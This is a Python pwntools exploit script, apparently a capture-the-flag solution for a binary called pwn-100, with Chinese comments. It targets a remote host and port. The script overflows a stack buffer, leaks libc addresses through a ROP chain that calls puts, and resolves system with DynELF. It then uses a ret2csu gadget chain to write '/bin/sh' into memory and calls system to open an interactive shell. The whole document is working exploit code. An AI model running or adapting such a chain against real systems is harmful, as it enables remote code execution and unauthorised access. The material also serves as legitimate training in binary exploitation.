from pwn import *

p=remote("61.147.171.105",51848)
#p = process('./pwn-100')
elf = ELF('./pwn-100')

puts_addr = elf.plt['puts']
read_addr = elf.got['read']

start_addr = 0x400550
pop_rdi = 0x400763 
gadget_1 = 0x40075a
gadget_2 = 0x400740

bin_sh_addr = 0x60107c  #存储/bin/sh的地址

def leak(addr):
    up = ''     
    content = ''
    payload = 'A'*0x48
    payload += p64(pop_rdi)  
    payload += p64(addr)
    payload += p64(puts_addr)
    payload += p64(start_addr)
    payload = payload.ljust(200, 'B')
    p.send(payload)
    p.recvuntil("bye~\n")
    while True: #防止未接受完整传回的数据
        c = p.recv(numb=1, timeout=0.1)
        if up == '\n' and c == "":
            content = content[:-1]+'\x00'
            break
        else:
            content += c
            up = c
    content = content[:4]
    return content

d = DynELF(leak, elf=elf)
system_addr = d.lookup('system', 'libc')
#调用read函数
payload = "A"*0x48
payload += p64(gadget_1)
payload += p64(0)
payload += p64(1)
payload += p64(read_addr)
payload += p64(8)
payload += p64(bin_sh_addr)
payload += p64(0)
payload += p64(gadget_2)
payload += '\x00'*56
payload += p64(start_addr)
payload = payload.ljust(200, "B")

#输入/bin/sh
p.send(payload)
p.recvuntil('bye~\n')
p.send("/bin/sh\x00")

#调用system函数
payload = "A"*72				
payload += p64(pop_rdi)			
payload += p64(bin_sh_addr)		
payload += p64(system_addr)		
payload = payload.ljust(200, "B")	

p.send(payload)
p.interactive()
